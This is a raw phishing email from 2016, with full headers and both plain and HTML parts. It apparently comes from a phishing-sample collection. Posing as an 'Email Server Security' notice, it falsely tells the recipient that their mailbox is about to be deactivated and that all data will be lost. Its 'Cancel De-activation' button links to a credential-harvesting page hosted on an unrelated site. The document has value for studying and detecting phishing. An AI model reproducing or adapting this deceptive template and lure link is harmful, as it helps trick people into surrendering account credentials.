@@ -1,0 +1,338 @@
+Return-Path: MAILER-DAEMON
+Delivered-To: jose@monkey.org
+X-FDA: 72130234302.20.boot54_247df946d0c61
+X-Spam-Summary: 77,5.524,0,9d9b01a4f667194c,d41d8cd98f00b204,,:,RULES_HIT:41:72:355:377:490:495:800:962:967:969:973:983:988:989:1147:1189:1208:1221:1260:1261:1263:1313:1314:1345:1381:1431:1433:1434:1436:1437:1516:1517:1518:1535:1542:1575:1588:1592:1594:1685:1711:1714:1730:1777:1792:2196:2198:2199:2200:2525:2560:2563:2610:2682:2685:2693:2737:2859:2894:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3351:3770:3865:3866:3867:3868:3871:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4117:4361:5007:6261:6669:6678:7628:7652:8516:8517:8518:8599:8603:8987:9025:9121:9388:10010:10215:10241:10346:10400:11233:11257:11480:11658:11914:12043:12517:12519:12764:13005:13017:13018:13019:13025:13095:13139:13237:13439:13846:13898:13975:14093:14096:14181:14721:14849:21080:21212:21325:21364:21433:21450:21451:21524:30016:30021:30022:30026:30054,0,RBL:200.187.78.12:@imf17.b.hostedemail.com:.lbl8.mailshell.net-62.16.4.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5
+X-HE-Tag: boot54_247df946d0c61
+X-Filterd-Recvd-Size: 6404
+Received: from msa-corp-relay01.infolink.com.br (msa-corp-relay01.infolink.com.br [200.187.78.12])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 31 Oct 2016 10:54:10 +0000 (UTC)
+Received: from msa-corp02.infolink.com.br (msa-corp-relay.infolink.com.br [200.187.78.51])
+	by msa-corp-relay01.infolink.com.br (Postfix) with ESMTPS id BF6192835AB
+	for <jose@monkey.org>; Mon, 31 Oct 2016 08:54:09 -0200 (BRST)
+Received: from localhost (localhost [127.0.0.1])
+	by msa-corp02.infolink.com.br (Postfix) with ESMTP id CBAE72606F4
+	for <jose@monkey.org>; Mon, 31 Oct 2016 08:51:56 -0200 (BRST)
+X-Virus-Scanned: Debian amavisd-new at msa-corp02.infolink.com.br
+Received: from msa-corp02.infolink.com.br ([127.0.0.1])
+	by localhost (msa-corp02.infolink.com.br [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id UY-x31qtxLne for <jose@monkey.org>;
+	Mon, 31 Oct 2016 08:51:56 -0200 (BRST)
+Received: from zol02.infolink.com.br (zol02.infolink.com.br [200.187.79.230])
+	by msa-corp02.infolink.com.br (Postfix) with ESMTPS id 23A3326075E
+	for <jose@monkey.org>; Mon, 31 Oct 2016 08:51:55 -0200 (BRST)
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by zol02.infolink.com.br (Postfix) with ESMTP id 0A58C200308
+	for <jose@monkey.org>; Mon, 31 Oct 2016 08:54:08 -0200 (BRST)
+Received: from zol02.infolink.com.br ([127.0.0.1])
+	by localhost (zol02.infolink.com.br [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id 3n7kd5L7USOZ for <jose@monkey.org>;
+	Mon, 31 Oct 2016 08:54:07 -0200 (BRST)
+Received: from [172.82.128.196] (unknown [172.82.128.196])
+	by zol02.infolink.com.br (Postfix) with ESMTPA id AF52B20030A
+	for <jose@monkey.org>; Mon, 31 Oct 2016 08:54:07 -0200 (BRST)
+Content-Type: multipart/alternative; boundary="===============0520909015=="
+MIME-Version: 1.0
+Subject: confirm request for Email deactivation for jose@monkey.org
+To: jose@monkey.org
+From: Email Server Security <>
+Date: Mon, 31 Oct 2016 03:56:49 -0700
+Message-Id: <20161031105407.AF52B20030A@zol02.infolink.com.br>
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 411
+
+You will not see this in a MIME-aware mail reader.
+--===============0520909015==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+
+ 	  =
+
+ =
+
+  =
+
+ =
+
+  Server Message  =
+
+ =
+
+  =
+
+
+ =
+
+   Dear jose@monkey.org    Our record indicates that you recently made a re=
+quest to deactivate email And this request will be processed shortly.  If t=
+his request was made accidentally or you have no knowledge of it, you are a=
+dvised to cancel the request now  =
+
+ =
+
+ =
+
+  =
+
+    Cancel De-activation    =
+
+ =
+
+ =
+
+  =
+
+  However, if you do not cancel this request, the deactivation will be effe=
+cted =
+
+ and all email data be lost permanently.  Regards.
+ Email Administrator  =
+
+ =
+
+ =
+
+  =
+
+ =
+
+ =
+
+ =
+
+  =
+
+  This message is auto-generated from E-mail security server, and replies s=
+ent to this email can not be delivered. =
+
+ This email is meant for: jose@monkey.org  =
+
+ =
+
+ =
+
+  =
+
+ 	 	 =
+
+=20
+--===============0520909015==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head>
+
+<table width=3D"100%" height=3D"" align=3D"center"><br>
+
+
+<td width=3D"10%"></td>
+
+
+
+
+
+
+
+<td width=3D"70%" bgcolor=3D"">
+
+
+   <table style=3D"border: solid 1px #A4A4A4;" cellspacing=3D"0"><tr><td>
+
+
+	<table width=3D"100%" cellspacing=3D"0">
+
+	<tr><td bgcolor=3D"#045FB4" height=3D"110">
+
+		<br>
+		<table width=3D"80%" align=3D"center"><tr><td>
+		<font face=3D"calibri" size=3D"+4" color=3D"#ffffff">
+		Server Message
+		</font>
+		</td></tr></table>
+
+	</td></tr>
+
+
+
+
+
+
+	<tr><td bgcolor=3D"#F8F8F8" height=3D"">
+
+
+		<br><br>
+		<table width=3D"80%" align=3D"center"><tr><td>
+		=
+
+		<font face=3D"calibri" size=3D"+2">
+		<b> Dear jose@monkey.org</b>
+		</font>
+
+		<p>
+
+		<font face=3D"calibri" size=3D"3">
+
+		=
+
+		=
+
+
+		Our record indicates that you recently made a request to deactivate email =
+
+		And this request will be processed shortly.
+
+		<p>
+
+		If this request was made accidentally or you have no knowledge of it, =
+
+		you are advised to cancel the request now
+
+		</font>
+		</td></tr></table>
+
+	</td></tr>
+
+
+
+
+
+
+	<tr><td height=3D"15" bgcolor=3D"#F8F8F8"></td></tr>
+
+
+
+
+
+	<tr><td bgcolor=3D"#F8F8F8">
+
+		<table width=3D"80%" bgcolor=3D"#045FB4" height=3D"60" align=3D"center"><=
+tr><td>
+		<div align=3D"center">
+		<a href=3D"http://realmcounseling.com/images/AccountJ/index.php?email=3Dj=
+ose@monkey.org" =
+
+		target=3D"_blank" style=3D"text-decoration:none">
+		<font face=3D"calibri" size=3D"+2" color=3D"#ffffff">
+		Cancel De-activation
+		</font>
+		</a>
+		</div>
+		</td></tr></table>
+
+	</td></tr>
+
+
+
+
+
+
+
+	<tr><td height=3D"20" bgcolor=3D"#F8F8F8"></td></tr>
+
+
+
+
+
+
+
+
+	<tr><td bgcolor=3D"#F8F8F8" height=3D"70">
+
+		<table width=3D"80%" align=3D"center"><tr><td>
+		=
+
+		<font face=3D"calibri" size=3D"3" color=3D"">
+		However, if you do not cancel this request, the deactivation will be effe=
+cted <br>
+		and all email data be lost permanently. =
+
+
+		<p>
+		Regards.<br>
+		<b>Email Administrator</b>
+
+
+		</font>
+		</td></tr></table>
+
+	</td></tr>
+
+
+
+
+
+
+
+	<tr><td height=3D"10" bgcolor=3D"#F8F8F8"></td></tr>
+
+
+
+
+
+	<tr><td height=3D"0" bgcolor=3D"#F8F8F8">
+		=
+
+		<table width=3D"80%" height=3D"10" align=3D"center"><tr><td>
+		<hr width=3D"100%" align=3D"center">
+		</td></tr></table>
+	</td></tr>
+
+
+
+	<tr><td bgcolor=3D"#F8F8F8">
+
+		<table width=3D"80%" height=3D"" align=3D"center"><tr><td>
+		<font face=3D"calibri" size=3D"2">
+		This message is auto-generated from E-mail security server, and replies s=
+ent to this email can not be delivered.
+		<br>
+		This email is meant for: <b><font color=3D"#045FB4">jose@monkey.org</font=
+></b>
+		</font>
+		</td></tr></table>
+
+	</td></tr>
+
+
+
+
+	<tr><td height=3D"30" bgcolor=3D"#F8F8F8"></td></tr>
+
+
+
+	</table>
+
+
+   </td></tr></table>
+
+
+
+</td>
+
+
+
+
+
+
+
+
+
+<td width=3D"20%"></td>
+
+
+</tr></table>
+
+
+
+</html>
+--===============0520909015==--
